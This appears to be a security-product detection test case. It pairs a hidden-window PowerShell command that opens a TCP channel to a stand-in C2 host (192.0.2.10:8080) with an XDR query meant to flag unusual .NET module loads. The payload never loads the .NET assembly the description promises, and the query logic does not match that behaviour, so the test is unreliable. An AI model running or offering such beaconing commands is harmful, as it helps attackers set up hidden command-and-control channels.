identity.name: Uncommon DotNet Module Load via PowerShell with C2 Communication
identity.summary: An attacker uses PowerShell to load a .NET assembly from a remote location, which then connects to a C2 server. Cortex should detect the unusual relationship between the PowerShell process and the .NE
identity.description: An attacker uses PowerShell to load a .NET assembly from a remote location, which then connects to a C2 server. Cortex should detect the unusual relationship between the PowerShell process and the .NET module load, as well as the outbound network connection.

payload.code: powershell.exe -NoP -W Hidden -Command "$client = New-Object System.Net.Sockets.TCPClient('192.0.2.10', 8080); $stream = $client.GetStream(); $reader = New-Object System.IO.StreamReader($stream); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine('Connected'); $writer.Flush(); $response = $reader.ReadLine(); $bytes = [System.Text.Encoding]::UTF8.GetBytes($response); $stream.Write($bytes, 0, $bytes.Length); $client.Close();"

expected_artifacts.description: PowerShell process executing with hidden window
Outbound TCP connection to C2 server
DotNet module loaded from remote location

biocs.name: Uncommon DotNet module load relationship
biocs.description: Detection of PowerShell loading a .NET assembly from an uncommon or non-standard path
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'powershell.exe'
| filter action_process_image_name contains '.NET'
| filter action_file_path not in ('C:\Windows\Microsoft.NET\', 'C:\Program Files\')
